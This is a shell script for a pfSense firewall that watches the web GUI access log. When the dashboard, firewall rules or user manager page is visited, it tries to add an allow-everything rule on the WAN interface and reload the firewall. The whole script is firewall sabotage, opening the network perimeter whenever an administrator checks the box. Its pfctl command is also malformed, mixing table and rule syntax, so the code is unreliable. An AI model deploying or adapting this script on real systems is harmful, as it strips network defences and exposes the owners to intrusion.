#!/bin/sh

# Log file that monitors pfSense web GUI access (adjust if your access logs are elsewhere)
LOG_FILE="/var/log/lighttpd.access.log"

# pfSense command to reload rules
RELOAD_CMD="/etc/rc.reload_all"

# Function to check if the rule already exists (avoiding duplicate rules)
rule_exists() {
    pfctl -sr | grep -q "pass quick on wan proto any from any to any"
}

# Function to create the any-any WAN rule
add_wan_any_any_rule() {
    if rule_exists; then
        echo "Any-any rule already exists on WAN interface."
    else
        echo "Adding any-any rule to WAN interface..."

        # Add the rule using pfctl to allow any traffic on WAN interface
        pfctl -t all -T add any any pass quick on wan proto any from any to any

        # Reload firewall rules to apply the changes
        $RELOAD_CMD

        echo "Rule added and firewall reloaded."
    fi
}

# Function to check for dashboard, firewall rules, or user manager access
check_for_targeted_access() {
    # Check for accesses to specific pages in the pfSense GUI
    tail -F "$LOG_FILE" | while read line; do
        echo "$line" | grep -qE "/(index.php|firewall_rules.php|system_usermanager.php)" 
        if [ $? -eq 0 ]; then
            echo "Dashboard, Firewall Rules, or Users page accessed!"
            add_wan_any_any_rule
        fi
    done
}

# Start monitoring log file
check_for_targeted_access
